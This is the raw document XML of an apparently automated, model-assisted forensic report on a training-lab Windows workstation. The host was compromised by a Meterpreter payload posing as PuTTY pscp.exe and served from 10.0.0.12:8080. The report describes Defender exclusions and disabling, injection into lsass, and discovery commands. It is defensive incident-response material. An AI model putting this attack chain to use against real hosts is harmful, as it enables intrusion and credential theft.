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1F3864"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>INCIDENT RESPONSE REPORT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Forensic analysis: test01</w:t>
      </w:r>
    </w:p>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Case</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>test01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Main system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>COMPROMISED. A Meterpreter payload disguised as PuTTY pscp.exe and served from 10.0.0.12:8080 ran on DESKTOP-KJ81A5A on 2023-11-10 at 11:03:09 UTC. It migrated into a spawned explorer.exe, touched lsass and ran discovery commands. No persistence or lateral movement was found.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Trace period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2010-01-19 16:07:10 → 2023-11-10 12:33:26.347270 (99.8 % of the events; full range 1983-08-07 09:00:00 → 2026-10-19 15:05:18)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Incident window (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 09:16:36 → 2023-11-10 12:16:03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical: 3, High: 6, Medium: 4, Informational: 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report date</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-19 16:04 UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Classification</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>CONFIDENTIAL: TLP:AMBER</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Production</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report generated by Sleuthline (analyze.py) with the assistance of a language model. Model: anthropic / claude-opus-5-5.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>Disclaimer: this report was produced automatically. Every finding is linked to verifiable records of the case database ("Reference" column) and to the original path of the artifact. It must be reviewed and validated by an analyst before any distribution or decision.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Table of contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
        <w:instrText xml:space="preserve">TOC \o "1-3" \h \z \u</w:instrText>
        <w:fldChar w:fldCharType="separate"/>
        <w:t>Table of contents: right-click &gt; Update Field (or F9) to display it.</w:t>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Executive summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Verdict: COMPROMISED. A Meterpreter payload disguised as PuTTY pscp.exe and served from 10.0.0.12:8080 ran on DESKTOP-KJ81A5A on 2023-11-10 at 11:03:09 UTC. It migrated into a spawned explorer.exe, touched lsass and ran discovery commands. No persistence or lateral movement was found.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The Windows 10 lab workstation DESKTOP-KJ81A5A (user medmondson, local administrator) was compromised on 2023-11-10 by a Metasploit Meterpreter implant. All times below are UTC; host local time is UTC-8 (Pacific).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Delivery**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:16 the user browsed http://10.0.0.12:8080/ in Edge and downloaded pscp.exe, a trojanised PuTTY PSCP 0.79.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Microsoft Defender detected and removed it three times as Trojan:Win64/Meterpreter.E.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender was then weakened: an exclusion for C:\Payloads\ was added at 10:19:24 and real-time protection was disabled at 10:19:46 and again at 11:02:11. Cloud protection and sample submission were also turned off.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The payload was copied to C:\Payloads\pscp.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Execution and post-exploitation**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:03:09 it was launched from an elevated PowerShell.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- It immediately spawned explorer.exe (PID 7324), injected into it, and opened a remote thread into lsass.exe, which points to credential theft.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Between 11:04 and 11:13 the attacker used command shells for reconnaissance: tracert, quser, tasklist, netstat -ntb, whoami /user and net user administrator.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The attacker also loaded the Meterpreter PowerShell extension (Invoke-DcSync bootstrap) and downloaded a further copy of the payload (1.exe) from 10.0.0.12:8080.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- During the session the user saved a plaintext password file (Desktop\not_my_pass.txt).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**What was not found**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No persistence, new accounts, lateral movement, data staging or log clearing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Impact and confidence**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Full interactive control of the host under a high-integrity administrator token.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Probable exposure of local credentials, from the lsass access and the plaintext file.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender left disabled.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Confidence is high: Sysmon, Prefetch, SRUM, Defender, PowerShell logs, WebCache and NTFS artefacts agree to the millisecond.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The environment is a deliberately "dirty" training lab, so some of the Defender tampering may be lab staging rather than attacker action.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Key figures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Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>19 (critical: 3, high: 6, medium: 4, informational: 6)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Key timeline events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Indicators of compromise</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Questions answered</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8 / 8 asked in the guidance</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>First / last key event (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36 → 2023-11-10 11:16:03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Main findings</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="794"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="4535"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Confidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-003</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Windows Defender detected Trojan:Win64/Meterpreter.E in pscp.exe downloaded from http://10.0.0.12:8080/pscp.exe (3 download attempts)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518 → 2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008</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Execution provenance of C:\Payloads\pscp.exe: launched by the user's elevated PowerShell (PID 1088), corroborated by Prefetch, SRUM, ShimCache, PSReadLine and 4104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53 → 2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-005</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Execution of C:\Payloads\pscp.exe (Meterpreter masquerading as PuTTY PSCP) and migration/injection into a spawned explorer.exe, then into lsass.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.877971 → 2023-11-10 11:03:56.300284</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-012</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Meterpreter chain ran under medmondson's elevated (High IL) token LogonId 0x15347 obtained via UAC consent; local Administrator account enumerated (4798 by net1.exe)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328 → 2023-11-10 11:13:35.806786</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-016</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Web origin of the Meterpreter payload: Edge (WebCache) browsing to http://10.0.0.12:8080/ and download of pscp.exe, MOTW preserved on C:\Payloads\pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36.111277 → 2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-004</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Windows Defender tampering: Tamper Protection toggled, path exclusion C:\Payloads\, cloud reporting disabled, real-time protection disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:40.345882 → 2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-017</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Defense-evasion state at collection time: Defender RTP still disabled and C:\Payloads\ excluded (registry); RTP disabled via Windows Security UI 57 s before pscp.exe launch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452 → 2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006</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Meterpreter post-exploitation from injected explorer.exe: discovery commands (tracert, quser, tasklist), PowerShell extension (MSFConsole host, Invoke-DcSync) and download of 1.exe from 10.0.0.12:8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:13.885211 → 2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-007</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Additional discovery commands from Meterpreter cmd shell 5848: netstat -ntb, whoami /user, net user administrator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.838148 → 2023-11-10 11:13:35.796776</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-019</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No collection/staging or bulk exfiltration evidenced; only attacker network peer is 10.0.0.12:8080 (C2/staging), low-volume outbound from injected explorer.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00 → 2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>File-system lifecycle of the payload: 3 Edge downloads of pscp.exe, copy to C:\Payloads\pscp.exe and original sent to the Recycle Bin (still recoverable as $RHOVDEL.exe)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:26.178698 → 2023-11-10 10:20:20.820023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-009</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Copies of the payload C:\Payloads\test.exe and C:\Users\medmondson\1.exe: downloaded from 10.0.0.12:8080, no execution evidence</w:t>
